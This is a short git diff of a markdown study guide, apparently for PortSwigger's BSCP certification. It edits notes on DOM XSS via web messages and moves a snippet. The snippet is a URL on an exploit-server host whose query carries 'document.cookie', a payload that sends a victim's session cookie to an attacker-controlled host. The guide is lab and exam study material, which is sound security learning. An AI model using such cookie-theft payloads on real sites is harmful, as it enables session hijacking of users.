@@ -65,13 +65,8 @@ The acronym BSCP has nice simular ring like OSCP  :)
 </script>
 ```  
 
->To exploit above code inject code into the JSON to change "load-channel" type ....incomplete....  
+>To exploit above code inject code into the JSON to change "load-channel" type ....require validation....  
 
->Using atob to decoded base64 to this 
-
-```
-http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie
-```  
   
 >Hosted exploit server body.  
 
@@ -102,6 +97,11 @@ http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=do
   
 [Testing for DOM XSS using web messages](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
 
+>Optional: Using atob to decoded base64 from below URL if single and double quote jail.  
+
+```
+http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie
+```  
 
 ## Web Cache Poison  
 
